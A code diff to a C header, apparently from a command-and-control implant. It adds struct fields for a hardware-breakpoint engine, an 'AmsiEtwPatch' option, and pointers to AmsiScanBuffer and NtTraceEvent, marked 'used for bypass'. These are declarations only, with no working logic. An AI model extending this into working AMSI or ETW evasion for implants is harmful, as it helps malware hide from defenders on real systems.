@@ -24,6 +24,7 @@
 #include <Core/Kerberos.h>
 #include <Core/Syscalls.h>
 #include <Core/SysNative.h>
+#include <Core/HwBpEngine.h>
 
 #include <Loader/CoffeeLdr.h>
 
@@ -98,6 +99,7 @@ typedef struct
             BOOL  StackSpoof;
             BOOL  SysIndirect;
             BYTE  ProxyLoading;
+            BYTE  AmsiEtwPatch;
             BOOL  Verbose;
             PVOID ThreadStartAddr;
             BOOL  CoffeeThreaded;
@@ -191,6 +193,7 @@ typedef struct
         WIN_FUNC( NtQueryInformationToken )
         WIN_FUNC( NtQueryInformationThread )
         WIN_FUNC( NtQueryObject )
+        PVOID NtTraceEvent;
 
         // Kernel32
         WIN_FUNC( LoadLibraryW )
@@ -372,6 +375,9 @@ typedef struct
         WIN_FUNC( LsaConnectUntrusted )
         WIN_FUNC( LsaFreeReturnBuffer )
 
+        /* Amsi.dll */
+        PVOID AmsiScanBuffer;
+
     } Win32;
 
     struct
@@ -467,6 +473,9 @@ typedef struct
         PVOID Ws2_32;
         PVOID Sspicli;
 
+        /* used for bypass */
+        PVOID Amsi;
+
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
 #endif
@@ -499,6 +508,7 @@ typedef struct
     PMEM_FILE            MemFiles;
     PSOCKET_DATA         Sockets;
     PCOFFEE              Coffees;
+    PHWBP_ENGINE         HwBpEngine;
 
 } INSTANCE;
 
